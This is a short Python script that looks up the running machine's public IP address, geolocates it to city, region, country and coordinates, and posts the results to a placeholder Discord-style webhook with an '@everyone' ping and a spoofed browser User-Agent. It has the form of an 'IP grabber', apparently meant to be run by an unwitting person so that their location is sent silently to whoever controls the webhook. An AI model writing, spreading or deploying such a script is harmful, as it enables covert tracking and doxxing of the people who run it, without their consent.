#!/usr/bin/env/python
import requests, json
from ip2geotools.databases.noncommercial import DbIpCity
from urllib.request import *

webhook_url = 'WEBHOOK URL HERE'
ping = True
geolocate = True

response = requests.get('https://api.ipify.org/?format=json')
dt = response.json()
headers = {
	'Content-Type': 'application/json',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
}
ip = dt['ip']
rsp = DbIpCity.get(ip, api_key='free')

message = '@everyone\n' if ping else ''
message += '```'
message += '\nIP: ' + dt['ip'] + '\n'
if geolocate:
	message += 'City: ' + f'{rsp.city}\n'
	message += 'Region: ' + f'{rsp.region}\n'
	message += 'Country: ' + f'{rsp.country}\n'
	message += 'Latitude: ' + f'{str(rsp.latitude)}\n'
	message += 'Longitude: ' + f'{str(rsp.longitude)}\n'
message += '```'
payload = json.dumps({'content': message})

req = Request(webhook_url, data=payload.encode(), headers=headers)
urlopen(req)
